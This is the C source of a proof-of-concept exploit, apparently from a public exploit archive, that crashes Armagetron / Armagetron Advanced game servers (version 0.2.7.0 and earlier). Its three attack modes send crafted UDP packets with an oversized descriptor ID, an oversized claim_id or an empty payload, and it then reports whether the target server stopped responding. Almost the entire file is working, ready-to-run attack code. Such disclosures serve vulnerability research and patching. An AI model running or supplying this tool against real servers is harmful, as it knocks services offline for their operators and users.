/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>

/* inserted win32.h /str0ke */
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>

void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}


    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
#endif



#define VER     "0.1"
#define BUFFSZ  2048
#define PORT    4534
#define TIMEOUT 3

#define SEND(x) if(sendto(sd, x, sizeof(x) - 1, 0, (struct sockaddr *)&peer, sizeof(peer)) \
                  < 0) std_err();
#define RECV    if(timeout(sd) < 0) { \
                    fputs("\nError: socket timeout, no reply received\n\n", stdout); \
                    exit(1); \
                } \
                len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL); \
                if(len < 0) std_err();



void show_info(u_char *data, int len);
int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len;
    u_short port = PORT;
    u_char  buff[BUFFSZ],
            info[] =
                "\x00\x35"
                "\x00\x00"
                "\x00\x00"
                "\x00\x00",
            pck[] =
                "\x00\x06"  // ID
                "\x00\x26"
                "\x00\x01"
                "\x00\x04"
                "\x00\x00"; // peers[claim_id]


    setbuf(stdout, NULL);

    fputs("\n"
        "Armagetron / Armagetron Advanced <= 0.2.7.0 server crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port(%d)]\n"
            "\n"
            "Attack:\n"
            " 1 = crash caused by big descriptor ID\n"
            " 2 = crash caused by big claim_id\n"
            " 3 = socket unreacheable through empty packet\n"
            "\n", argv[0], port);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 3) port = atoi(argv[3]);

    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    fputs("- retrieve informations:\n", stdout);
    SEND(info);
    RECV;
    show_info(buff, len);

    fputs("- send BOOM packet\n", stdout);
    switch(atoi(argv[1])) {
        case 1: {
            *(u_short *)pck = htons(0xffff);
            SEND(pck);
            } break;
        case 2: {
            *(u_short *)(pck + sizeof(pck) - 3) = htons(0xffff);
            SEND(pck);
            } break;
        case 3: {
            SEND("");
            } break;
        default: {
            fputs("\nError: wrong type of attack selected\n\n", stdout);
            exit(1);
            }
    }

    fputs("- check server:\n", stdout);
    SEND(info);
    if(timeout(sd) < 0) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
    }

    close(sd);
    return(0);
}



void show_info(u_char *data, int len) {
#define SHOW(x) sz = *(u_short *)data; \
                data += 2; \
                if(sz > 1) printf(x "%s\n", data); \
                data += sz + (sz & 1);
    u_short *ds,
            sz,
            players;
    u_char  *p,
            *p1;

    ds = (u_short *)data;
    for(len >>= 1; len--; ds++) {
        *ds = ntohs(*ds);
    }
    fputc('\n', stdout);
    data += 14;
    SHOW("  Hostname     ");
    players = *(u_short *)data;
    data += 12;
    SHOW("  version      ");
    data += 4;
    sz = *(u_short *)data;
    data += 2;
    printf("  %d players:\n", players);
    for(p = data; players--; p = p1 + 1) {
        p1 = strchr(p, '\n');
        if(!p1) break;
        *p1 = 0x00;
        printf("             - %s\n", p);
    }
    data += sz + (sz & 1) + 4;
    SHOW("  URL          ");
    fputc('\n', stdout);
#undef SHOW
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

// milw0rm.com [2005-02-10]
